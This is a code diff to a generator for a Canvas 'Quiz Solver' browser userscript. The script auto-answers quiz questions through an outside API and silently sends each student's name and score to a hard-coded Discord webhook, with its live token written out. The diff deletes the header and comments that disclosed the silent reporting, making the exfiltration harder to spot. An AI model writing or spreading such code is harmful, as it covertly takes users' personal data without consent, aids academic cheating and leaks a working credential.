@@ -343,23 +343,14 @@
             generatedCode = `// ==UserScript==
 // ayaw ninyo i share gais plz, group 5 member only.
 
-// @name         Canvas Quiz Solver
-// @namespace    http://tampermonkey.net/
-// @version      2.0
-// @description  Solves all questions, waits for manual submit, then silently sends name+score to Discord.
-// @match        https://*.instructure.com/courses/*/quizzes/*/take*
-// @match        https://*.instructure.com/courses/*/quizzes/*/submissions*
-// @grant        GM_xmlhttpRequest
 // ==/UserScript==
 
 (function() {
     'use strict';
     
-    // Only run once per page
     if (window.__QUIZ_SOLVER_DISCORD_RAN) return;
     window.__QUIZ_SOLVER_DISCORD_RAN = true;
     
-    // --- Configuration ---
     const CONFIG = {
         API_URL: 'https://canvasquiz-new.uc.r.appspot.com/generate',
         DELAY: 600,
@@ -368,7 +359,6 @@
         DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/1431574484254724138/h4gPtugjG-CH9p4nOVmNvg7FBSIYh8ZUOdzzFfEbKqkR8SW4cl5MxjpCNdzatWW_BoVc'
     };
     
-    // --- Custom Selectors (detected from your quiz HTML) ---
     const SELECTORS = {
         mainContainer: '${s.mainContainer}',
         questionText: '${s.questionText}',
@@ -383,7 +373,6 @@
         questionNumber: 'span[aria-hidden="true"]'
     };
     
-    // --- State ---
     const State = {
         processedQuestions: new Set(),
         solvedCount: 0,
@@ -393,34 +382,28 @@
         discordSent: false
     };
     
-    // --- Helper Functions ---
     const sleep = ms => new Promise(r => setTimeout(r, ms));
     
     function cleanText(text) {
         return text ? text.replace(/\\s+/g, ' ').replace(/[^\\w\\s.,?!;:'"()-]/g, '').trim() : '';
     }
     
-    // --- Discord Webhook Functions (silent) ---
     function getStudentNameFromPage() {
-        // Try to get from ENV first
         if (window.ENV && window.ENV.current_user && window.ENV.current_user.display_name) {
             return window.ENV.current_user.display_name;
         }
         if (window.ENV && window.ENV.current_user && window.ENV.current_user.name) {
             return window.ENV.current_user.name;
         }
-        // Fallback: try to extract from any element that contains the name pattern
         const nameEl = document.querySelector('.css-3tuj8u-text, .user_name, .profile_name');
         if (nameEl) return nameEl.textContent.trim().split(' —')[0];
         return 'Unknown Student';
     }
     
     function getScoreFromPage() {
-        // Try to get the numeric score from the results page
         const scoreNumEl = document.querySelector('.css-1w489j8-text');
         if (scoreNumEl) {
             const score = scoreNumEl.textContent.trim();
-            // Also try to get total points
             const totalEl = document.querySelector('.css-1w53snm-text');
             let total = '';
             if (totalEl) {
@@ -429,7 +412,6 @@
             }
             return total ? \`\${score} out of \${total} points\` : \`\${score} points\`;
         }
-        // Fallback: look for percentage
         const percentEl = document.querySelector('[data-automation="sdk-quiz-score-percentage"]');
         if (percentEl) return percentEl.textContent.trim();
         return null;
@@ -458,7 +440,6 @@
         } catch (err) {}
     }
     
-    // --- Wait for results page and send Discord ---
     function waitForResultsAndSend() {
         if (State.discordSent) return;
         
@@ -468,14 +449,11 @@
             if (score) {
                 clearInterval(checkInterval);
                 State.discordSent = true;
-                // Silently send to Discord
                 sendToDiscord(name, score);
-                // Remove status panel if exists
                 if (State.statusDiv) State.statusDiv.remove();
             }
         }, 1000);
         
-        // Timeout after 30 seconds
         setTimeout(() => {
             clearInterval(checkInterval);
             if (!State.discordSent) {
@@ -488,7 +466,6 @@
         }, 30000);
     }
     
-    // --- Status Panel ---
     function createStatusPanel() {
         if (!CONFIG.SHOW_STATUS || State.statusDiv) return;
         
@@ -527,7 +504,6 @@
         if (el) el.innerText = value;
     }
     
-    // --- Extract Question from the current DOM ---
     function extractCurrentQuestion() {
         const container = document.querySelector(SELECTORS.mainContainer);
         if (!container) return null;
